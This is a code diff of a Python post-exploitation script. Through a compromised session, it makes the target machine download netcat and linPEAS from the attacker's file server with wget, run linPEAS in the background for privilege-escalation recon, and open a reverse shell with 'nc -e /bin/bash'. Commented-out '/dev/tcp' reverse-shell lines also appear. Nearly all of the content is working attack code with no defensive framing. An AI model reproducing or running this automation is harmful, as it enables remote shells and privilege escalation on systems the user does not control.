@@ -19,7 +19,8 @@ def parse_args():
     args = parser.parse_args()
     return args
 
-def get_file(tmp_dir,ip,lport,p,filename):
+
+def get_file(tmp_dir, ip, lport, p, filename):
     p.sendline(f"wget http://{ip}:{lport}/{filename} -O {tmp_dir}/{filename}".encode())
     p.sendline(f"chmod +x {tmp_dir}/{filename}".encode())
 
@@ -35,27 +36,27 @@ def reverse_shell_recon(tmp_dir, port, current_os, lport, ip, mport):
     threading.Thread(target=manual_shell, args=(mport,)).start()
     # Spawn a new shell
     sleep(5)
-    #p.sendline(f"bash -i >& /dev/tcp/{ip}/{5555} 0>&1 &".encode())
-    #p.sendline(f"nc {ip} {mport} 0>&1 &".encode())
-
+    # p.sendline(f"bash -i >& /dev/tcp/{ip}/{5555} 0>&1 &".encode())
+    # p.sendline(f"nc {ip} {mport} 0>&1 &".encode())
 
     if os.path.exists("./linpeas.sh"):
         print("The file exists")
         p.sendline(f"mkdir {tmp_dir}".encode())
-        get_file(tmp_dir,ip,lport,p,"nc")
+        get_file(tmp_dir, ip, lport, p, "nc")
         p.sendline(f"wget http://{ip}:{lport}/linpeas.sh -O {tmp_dir}/linpeas.sh".encode())
         p.sendline(f"chmod +x {tmp_dir}/linpeas.sh".encode())
         p.sendline(f"cd {tmp_dir}".encode())
-        p.sendline(f"./nc {ip} {mport} -e /bin/bash &".encode())
-        p.sendline(f"./linpeas.sh > linpeas.txt".encode())
-        # Save the output of the linpeas script
-        p.sendline(f"cat linpeas.txt".encode())
+        p.sendline(f"nohup ./linpeas.sh -w -q -s < /dev/null > linpeas.txt 2>&1 &".encode())
+        # Linpeas will run in the background with the output redirected to a file and
+        # input from /dev/null and errors redirected to stdout
+        p.sendline(f"./nc {ip} {mport} -e /bin/bash".encode())
+
     else:
         print("The file doesn't exist")
         # p.sendline("wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh")
         # p.sendline("cat linpeas.sh")
 
-    time.sleep(5)
+    time.sleep(9999)
     print("Job done!")
     exit()
 
@@ -74,7 +75,6 @@ def manual_shell(mport):
     # Wait for needle to appear in the output
     p.recvuntil(needle.encode())
     p.interactive()
-
 
 
 def get_ip_address(ifname):
@@ -107,7 +107,7 @@ def main():
     # 2. Spawn the file server thread
     threading.Thread(target=file_server, args=(lport,)).start()
     # 3. Spawn the manual shell thread
-    #threading.Thread(target=manual_shell, args=(mport,)).start()
+    # threading.Thread(target=manual_shell, args=(mport,)).start()
 
 
 if __name__ == "__main__":
